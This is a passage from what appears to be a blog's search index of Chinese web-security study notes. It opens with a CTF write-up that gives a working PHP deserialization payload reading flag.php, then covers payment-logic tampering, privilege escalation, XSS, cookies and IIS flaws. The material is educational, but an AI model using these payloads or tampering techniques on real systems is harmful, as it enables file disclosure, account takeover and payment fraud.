<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020-网鼎杯-青龙组-Web-AreUSerialz</title>
    <url>/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/</url>
    <content><![CDATA[<p>知识点：php代码审计，魔术方法，php反序列化，弱类型绕过</p>
<p>题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//包含flag.php,显然要读取这个文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;<span class="comment">//类</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//构造函数，创建对象时触发其中内容，所以我们要构造一个类来触发</span></span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//让op == &quot;2&quot;来触发下面的读取函数</span></span><br><span class="line">      <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();<span class="comment">//读取函数</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">      <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//析构函数,销毁类的时候，也就是在最后执行</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//===弱类型，强制将2转换为1，所以考虑绕过，加空格 op =‘ 2‘</span></span><br><span class="line">      <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);<span class="comment">//反序列化，所以要先将对象序列化</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ctfhub靶场实操：</p>
<p>开启容器：</p>
<img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/2020-网鼎杯-青龙组-Web-AreUSerialz/image-20230211185729917.png" alt="image-20230211185729917" style="zoom:50%;">

<p>给出源代码：</p>
<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211185816020.png" alt="image-20230211185816020"></p>
<p>根据前文代码审计编写php脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot; &quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot;%202&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;%20&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>拼接：</p>
<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190135812.png" alt="image-20230211190135812"></p>
<p>查看源码：</p>
<p><img src="/2023/02/11/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-Web-AreUSerialz/image-20230211190155840.png" alt="image-20230211190155840"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>序列化：</strong>序列化是将变量或对象转换成字符串的过程，用于存储或传递的值的过程中，同时不丢失其类型和结构。</p>
<p><strong>反序列化：</strong>反序列化是将字符串转换成变量或对象的过程</p>
<p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210150104844.png" alt="image-20230210150104844"></p>
<span id="more"></span>

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码 执行，SQL 注入，目录遍历等不可控后果。</p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>是一种特殊方法当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>() <span class="comment">//将一个对象转换成一个字符串` </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>() <span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure>

<p>触发原因：<code>unserialize()</code> 函数的变量可控，文件中存在可利用的类与类中的魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//创建对象时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性`</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用 isset()或 empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用 unset()时触发`</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发`</span></span><br></pre></td></tr></table></figure>

<h3 id="无类序列化"><a href="#无类序列化" class="headerlink" title="无类序列化"></a>无类序列化</h3><p>运行代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;yuanjiu&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$KEY</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:7:&quot;yuanjiu&quot;;</span><br></pre></td></tr></table></figure>



<p><strong>有类与无类的区别主要在于有无魔术方法，而魔术方法在特定情况下会被触发</strong></p>
<h3 id="有类序列化"><a href="#有类序列化" class="headerlink" title="有类序列化"></a>有类序列化</h3><p><img src="/2023/02/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230210154025361.png" alt="image-20230210154025361"></p>
<p>代码审计&#x3D;》魔术方法</p>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/articles/network/355848.html">https://www.freebuf.com/articles/network/355848.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/341654.html">https://www.freebuf.com/articles/web/341654.html</a></p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>业务逻辑漏洞</title>
    <url>/2023/02/10/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>业务逻辑漏洞中，支付漏洞最常见，而支付漏洞一直以来就是是高风险，对企业来说危害很大，对用户来说同样危害也大。</p>
<span id="more"></span>

<h3 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h3><p><strong>要了解支付漏洞就要先了解商品的购买流程：</strong></p>
<p>选择商品和数量**&#x3D;&gt;<strong>选择支付及配送方式</strong>&#x3D;&gt;<strong>生成订单编号</strong>&#x3D;&gt;<strong>订单支付选择</strong>&#x3D;&gt;**完成支付</p>
<h3 id="常见参数："><a href="#常见参数：" class="headerlink" title="常见参数："></a>常见参数：</h3><p><strong>通过篡改参数来利用漏洞</strong></p>
<p>商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等</p>
<p>购买数量：改成负数，达到金额偏差</p>
<p>订单号：用B商品的价格买A商品</p>
<p>支付方式：更改支付接口，使金额支付到其它账户</p>
<h3 id="常见修改方法："><a href="#常见修改方法：" class="headerlink" title="常见修改方法："></a>常见修改方法：</h3><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>水平垂直越权</title>
    <url>/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<p><img src="/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20230207151741353.png" alt="image-20230207151741353"></p>
<span id="more"></span>

<p><strong>水平越权</strong>：获取同级用户账户信息</p>
<p><strong>垂直越权</strong>：添加高权限用户</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>获取添加用户的数据包</p>
<h5 id="如何获取数据包"><a href="#如何获取数据包" class="headerlink" title="如何获取数据包"></a>如何获取数据包</h5><ol>
<li>普通用户前端有操作页面可以抓取数据包</li>
<li>通过网站源码本地搭建去模拟抓取</li>
<li>盲猜</li>
</ol>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h5 id="前端漏洞造成：界面"><a href="#前端漏洞造成：界面" class="headerlink" title="前端漏洞造成：界面"></a>前端漏洞造成：界面</h5><p>判断用户等级后，代码界面部分进行可选显示 </p>
<h5 id="后端漏洞造成：数据库"><a href="#后端漏洞造成：数据库" class="headerlink" title="后端漏洞造成：数据库"></a>后端漏洞造成：数据库</h5><p>user 表(管理员和普通用户同表）如：</p>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>password</th>
<th>usertype</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>123456</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>xiaodi</td>
<td>11111</td>
<td>2</td>
</tr>
</tbody></table>
<p><strong>代码的级别判断</strong>：usertype值</p>
<p>若访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，可尝试对此值进行修改，这就是测试越权漏洞基本方法。</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>关于xss的相关总结</title>
    <url>/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>跨站攻击，即Cross Site Script Execution(通常简写为XSS)，是前端的漏洞，产生在浏览器一端的漏洞。它是指攻击者在网页中嵌入客户端脚本，主要利用js编写的恶意代码来执行一些想要的功能，也就是说它能干嘛是受到js的控制，那么js能执行出什么脚本代码就取决于它能干嘛。当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。</p>
<span id="more"></span>

<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>是一种非持续型攻击。漏洞本身存在，但是需要攻击者构造出来，然后让对方去触发。它不会对正常的访问造成跨站攻击。这种攻击是一次型攻击，它不会写入到数据库里。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射。</p>
<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135008161.png" alt="image-20230207135008161"></p>
<h4 id="出现地方"><a href="#出现地方" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据一般不会被存在数据库里面，一次性，所见即所得，一般出现在查询类页面</p>
<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>是一种持续型的攻击。将跨站代码植入到网站的数据库中。一旦攻击者第一次成功攻击之后，那么在后续的其他访问者均会受到跨站攻击。这种攻击可能是写到网站的留言板，那么当对方访问留言板就会被触发。它与反射型、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。它们之间最大区别在于反射型与DOM型XSS执行都必须依靠用户手动触发，而存储型XSS却不需要。</p>
<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207135110317.png" alt="image-20230207135110317"></p>
<h4 id="出现地方-1"><a href="#出现地方-1" class="headerlink" title="出现地方"></a>出现地方</h4><p>交互的数据会被存在数据库里面，永久性存储，一般出现在留言板、注册等页面</p>
<h3 id="xss的作用"><a href="#xss的作用" class="headerlink" title="xss的作用"></a>xss的作用</h3><p>常规用到的是盗取cookie、js做钓鱼攻击、流量指向等。主要是盗取管理员的会话和cookie信息，就是我们常说的管理员凭证，就意味着得到后台权限，可以直接利用。还能配合别的漏洞，比如可以和网页木马结合，扔到那里去跳转到网马地址，网马地址被执行后续就控制一些权限</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态地访问和更新文档的内容、结构和样式。</p>
<p>通过js可以重构整个HTML页面，而要重构页面或者页面中的某个对象，js就需要知道HTML文档中所有元素的“位置”。而DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档结构。根据DOM规定，HTML文档中的每个成分都是一个节点。</p>
<p>DOM的规定如下：</p>
<p>整个文档是一个文档节点；</p>
<p>每个HTML标签是一个元素节点；</p>
<p>包含在HTML元素中的文本是文本节点；</p>
<p>每一个HTML属性是一个属性节点；</p>
<p>节点与节点之间都有等级关系。</p>
<p>HTML的标签都是一个个的节点，而这些节点组成了DOM的整体结构：节点树。如图所示：</p>
<p><img src="https://image.3001.net/images/20210602/1622624351_60b7485f98c53cbc653a9.jpg!small" alt="img"></p>
<p>简单来说，DOM为一个一个访问html的标准编程接口。</p>
<p>可以发现DOM本身就代表文档的意思，而基于DOM型的XSS是不需要与服务器端交互的，它只发生在客户端处理数据阶段，是基于javascript的。而上面两种XSS都需要服务端的反馈来构造xss。</p>
<p>参考文章：<a href="https://www.freebuf.com/articles/web/276998.html">https://www.freebuf.com/articles/web/276998.html</a></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>关于cookie的相关总结</title>
    <url>/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="set-cookie格式（一个cookie）"><a href="#set-cookie格式（一个cookie）" class="headerlink" title="set cookie格式（一个cookie）"></a>set cookie格式（一个cookie）</h3><p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207125247970.png" alt="image-20230207125247970"></p>
<p>expires的是否设定决定cookie保存在内存还是磁盘</p>
 <span id="more"></span>

<h3 id="session和cookie的区别"><a href="#session和cookie的区别" class="headerlink" title="session和cookie的区别"></a>session和cookie的区别</h3><p>若没有设定，则为短期cookie，保存于内存，关闭浏览器即失效</p>
<p>若设定过期时间，则到过期时间失效，保存于磁盘</p>
<p>（1）session保存在服务器端(客户端仅保存一个sessionID)，Cookie保存在客户端。</p>
<p>（2）session保存的是对象，Cookie保存的是<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>。cookie的存储限制数据量不大于4KB，而session的容量则是无限量的。</p>
<p>（3）session不能区分路径，同一个用户在访问同一个Web应用程序期间，所有的session在任何路径都可访问。Cookie中如果设置了路径参数，则在其他路径下无法访问。</p>
<p>（4）session默认保存SeesionID的方法是Cookie，如果客户端禁用了Cookie，服务器端应采用其他的替代方法替代SessionID。</p>
<p>（5）session在会话结束后就会关闭，但是Cookie可以经过持久化而长期保存在客户端的本地硬盘上。所以session也更安全。</p>
<p><img src="/2023/02/07/%E5%85%B3%E4%BA%8Ecookie%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/image-20230207132732376.png" alt="image-20230207132732376"></p>
<h3 id="JavaScript语法"><a href="#JavaScript语法" class="headerlink" title="JavaScript语法"></a>JavaScript语法</h3><p>获取cookie：<code>document.cookie;</code></p>
<p>设置cookie: <code>document.cookie=&quot;username=yuanjiu&quot;;</code></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>web中间件常见漏洞总结</title>
    <url>/2023/02/06/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。<br><strong>IIS</strong> 目前只适用于目前只适用于 <strong>Windows</strong> 系统，不适用于其他操作系统。系统，不适用于其他操作系统。</p>
 <span id="more"></span>

<h4 id="解析漏洞解析漏洞"><a href="#解析漏洞解析漏洞" class="headerlink" title="解析漏洞解析漏洞"></a>解析漏洞解析漏洞</h4><h5 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h5><p>基于文件名</p>
<p>该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是 服务器默认不解析; 号及其后面的内容，相当于截断。</p>
<p>基于文件夹名</p>
<p>该版本 默认会将 *.asp&#x2F;目录下的所有文件当成Asp解析。</p>
<p>另外，IIS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp，</p>
<p>从网站属性-&gt;主目录-&gt;配置 可以看出，他们都是调用了asp.dll进行的解析。</p>
<p>修复建议修复建议</p>
<p>由于微软并不认为这是一个漏洞，也没有推出IIS 6.0的补丁，因此漏洞需要自己修复。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 限制上传目录执行权限，不允许执行脚本。</span><br><span class="line">2. 不允许新建目录。</span><br><span class="line">3. 上传的文件需经过重命名(时间戳+随机数+.jpg等)</span><br></pre></td></tr></table></figure>

<h5 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h5><p>安装IIS7.5，<br>1.控制面板 -&gt; 程序 -&gt; 打开或关闭windows功能。</p>
<p>2.下载php-5.2.6-win32-installer.msi</p>
<p>3.打开msi，一直下一步来到选择web server setup的界面，在这里选择IIS fastcgi,之后一直下一步。</p>
<p>4.打开IIS，管理工具 -&gt;Internet 信息服务(IIS)管理器</p>
<p>5.选择编辑ISAPI或者CGI限制</p>
<p>添加安装的php-cgi.exe路径，描述随意。</p>
<p>6.返回第五步的第一个图片位置，点击处理程序映射，添加如下。</p>
<p>7.phpinfo测试</p>
<p>IIS7.x版本 在Fast-CGI运行模式下,在任意文件，例：test.jpg后面加上&#x2F;.php，会将test.jpg 解析为php文件。</p>
<p>修复建议修复建议</p>
<p>配置cgi.fix_pathinfo(php.ini中)为 0 并重启php-cgi程序</p>
<p>结果如下：</p>
<h3 id="PUT-任意文件写入任意文件写入"><a href="#PUT-任意文件写入任意文件写入" class="headerlink" title="PUT 任意文件写入任意文件写入"></a>PUT 任意文件写入任意文件写入</h3><p>IIS Server 在 Web 服务扩展中开启了 WebDAV之后，支持多种请求，配合写入权限，可造成任意文件写入。</p>
<p>修复建议修复建议</p>
<p>关闭WebDAV 和 写权限</p>
<h3 id="IIS-短文件漏洞短文件漏洞"><a href="#IIS-短文件漏洞短文件漏洞" class="headerlink" title="IIS 短文件漏洞短文件漏洞"></a>IIS 短文件漏洞短文件漏洞</h3><p>Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 Windows的程序访问这些文件。在cmd下输入”dir &#x2F;x”即可看到短<br>文件名的效果。</p>
<p>IIS短文件名产生：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.当后缀小于 4 时，短文件名产生需要文件(夹)名前缀字符长度大于等于 9 位。</span><br><span class="line">2.当后缀大于等于 4 时，文件名前缀字符长度即使为 1 ，也会产生短文件名。</span><br></pre></td></tr></table></figure>

<p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。<br>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
<p>复现：</p>
<p>IIS8.0以下版本需要开启ASP.NET支持，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。<br>以下通过开启IIS6.0 ASP.NET后进行复现。</p>
<p>当访问构造的某个存在的短文件名，会返回 404 ；</p>
<p>当访问构造的某个不存在的短文件名，会返回 400 ；</p>
<p>IIS短文件漏洞局限性</p>
<ol>
<li><p>如果文件名本身太短也是无法猜解的；</p>
</li>
<li><p>此漏洞只能确定前 6 个字符，如果后面的字符太长、包含特殊字符，很难猜解；</p>
</li>
<li><p>如果文件名前 6 位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</p>
</li>
<li><p>如果文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</p>
</li>
